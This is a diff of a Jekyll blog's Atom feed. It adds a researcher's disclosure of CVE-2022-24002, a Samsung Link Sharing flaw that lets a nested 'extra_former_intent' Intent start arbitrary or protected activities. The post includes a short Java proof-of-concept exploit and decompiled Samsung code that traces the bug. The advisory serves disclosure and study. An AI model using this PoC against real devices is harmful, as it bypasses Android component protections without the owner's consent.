@@ -1,4 +1,116 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-31T21:30:03-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">YayWebsiteYay (I suck at titles)</title><subtitle>Sometimes I want to publish stuff unfiltered.</subtitle><entry><title type="html">Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”</title><link href="http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html" rel="alternate" type="text/html" title="Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”" /><published>2021-12-31T10:00:00-05:00</published><updated>2021-12-31T10:00:00-05:00</updated><id>http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own</id><content type="html" xml:base="http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html">&lt;p&gt;In March 2020 (literally a week before the world shut down the first time), F-Secure held an “Internal F-Secure Pwn2Own” where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard:&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-11T22:15:41-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">YayWebsiteYay (I suck at titles)</title><subtitle>Sometimes I want to publish stuff unfiltered.</subtitle><entry><title type="html">CVE-2022-24002 - Samsung Link Sharing Start Any Activity</title><link href="http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity.html" rel="alternate" type="text/html" title="CVE-2022-24002 - Samsung Link Sharing Start Any Activity" /><published>2022-02-11T10:00:00-05:00</published><updated>2022-02-11T10:00:00-05:00</updated><id>http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity</id><content type="html" xml:base="http://localhost:4000/research/2022/02/11/samsung-link-sharing-start-any-activity.html">&lt;p&gt;In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Any exported activity&lt;/li&gt;
+  &lt;li&gt;Any protected activity within the Link Sharing application&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I submitted this bug to Samsung but they said someone else already reported it. Today Samsung publicly disclosed the CVE ID for this issue, and credit goes to Dawuge of Pangu Team. I guess it is safe for me to disclose my PoC for it:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Intent intent = new Intent();
+intent.setComponent(new ComponentName(&quot;com.samsung.android.app.simplesharing&quot;, &quot;com.samsung.android.app.simplesharing.presentation.precondition.PreconditionActivity&quot;));
+
+Intent intent2 = new Intent();
+intent2.setComponent(new ComponentName(&quot;com.sec.android.app.sbrowser&quot;, &quot;com.sec.android.app.sbrowser.SBrowserLauncherActivity&quot;)); // replace with any other target component
+intent2.setData(Uri.parse(&quot;https://www.f-secure.com&quot;));
+intent2.putExtra(&quot;yay&quot;, &quot;boo&quot;);
+
+Bundle bundle = new Bundle();
+bundle.putInt(&quot;extra_request_code&quot;, 9001);
+bundle.putParcelable(&quot;extra_former_intent&quot;, intent2);
+
+intent.putExtras(bundle);
+
+startActivity(intent);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;technical-details&quot;&gt;Technical Details&lt;/h2&gt;
+
+&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreConditionActivity&lt;/code&gt; is opened, the Intent is passed onto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.android.app.simplesharing.presentation.precondition.PreconditionViewModel.handlePrecondition(intent)&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.precondition;
+
+public final class PreconditionActivity extends AppCompatActivity {
+
+    public void onCreate(Bundle bundle) {
+        AndroidInjection.inject(this);
+        ...
+        PreconditionViewModel viewModel = getViewModel();
+        ...
+        viewModel.handlePrecondition(intent);
+    }
+
+    public final PreconditionViewModel getViewModel() {
+        return (PreconditionViewModel) this.viewModel$delegate.getValue();
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The Intent is processed, and the parcelable extra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;extra_former_intent&lt;/code&gt; is stored in the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt;. This variable can then be called via the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFormerIntent()&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.precondition;
+
+public final class PreconditionViewModel extends AndroidViewModel {
+
+    private Intent formerIntent;
+
+    public final void handlePrecondition(Intent intent) {
+        if (!this.isInit) {
+            this.isInit = true;
+            if (isFromSdk(intent)) {
+                this.callerType = CallerType.TYPE_SDK;
+                if (enforceShowPermissionNotice()) {
+                    setShouldEnforceShowPermissionNotice();
+                } else {
+                    setShouldRequestPermission();
+                }
+            } else if (isOptionalContactRequest(intent)) {
+                setShouldRequestContactPermission();
+            } else if (isOptionalCameraRequest(intent)) {
+                setShouldRequestCameraPermission();
+            } else {
+                Intent intent2 = (Intent) intent.getParcelableExtra(&quot;extra_former_intent&quot;);
+                this.formerIntent = intent2;
+                ...
+    }
+
+    public final Intent getFormerIntent() {
+        return this.formerIntent;
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Going back to the class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.android.app.simplesharing.presentation.precondition.PreconditionActivity&lt;/code&gt;, the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startFormalIntentActivity()&lt;/code&gt; is called which then retrieves the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt; via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFormerIntent()&lt;/code&gt;, and then calls class &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.samsung.android.app.simplesharing.presentation.common.util.NavigatorUtil&lt;/code&gt; method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startActivityFromFormerIntent(Activity, Intent)&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.precondition;
+
+public final class PreconditionActivity extends AppCompatActivity {
+
+    public final void startFormalIntentActivity() {
+        if (getViewModel().isProcessRestart()) {
+            NavigatorUtil.startHistoryActivity$default(NavigatorUtil.INSTANCE, this, false, null, 6, null);
+        } else {
+            Intent formerIntent = getViewModel().getFormerIntent();
+            if (formerIntent != null) {
+                NavigatorUtil.INSTANCE.startActivityFromFormerIntent(this, formerIntent);
+            }
+        }
+        finishWithSuccess();
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt; is finally passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startActivity(Activity, Intent)&lt;/code&gt;, where the component in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;formerIntent&lt;/code&gt; is used to start a new activity:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.samsung.android.app.simplesharing.presentation.common.util;
+
+public final class NavigatorUtil {
+
+    public final void startActivityFromFormerIntent(Activity activity, Intent intent) {
+        Intent copyIntent = copyIntent(intent);
+        if (intent.getClipData() != null) {
+            copyIntent.setClipData(intent.getClipData());
+            copyIntent.addFlags(1);
+        }
+        INSTANCE.startActivity(activity, copyIntent);
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="research" /><category term="bug" /><category term="collision" /><summary type="html">In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:</summary></entry><entry><title type="html">Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”</title><link href="http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html" rel="alternate" type="text/html" title="Sonew Bluetooth Lock-Scripts and “Internal F-Secure Pwn2Own”" /><published>2021-12-31T10:00:00-05:00</published><updated>2021-12-31T10:00:00-05:00</updated><id>http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own</id><content type="html" xml:base="http://localhost:4000/research/2021/12/31/sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own.html">&lt;p&gt;In March 2020 (literally a week before the world shut down the first time), F-Secure held an “Internal F-Secure Pwn2Own” where each office competed to hack as many in-scope devices as possible. I volunteered to hack the Sonew Bluetooth Lock, aka this bastard:&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/2021-12-31-sonew-bluetooth-lock-scripts-and-internal-f-secure-pwn2own/image1.png&quot; alt=&quot;yay&quot; /&gt;&lt;/p&gt;
 
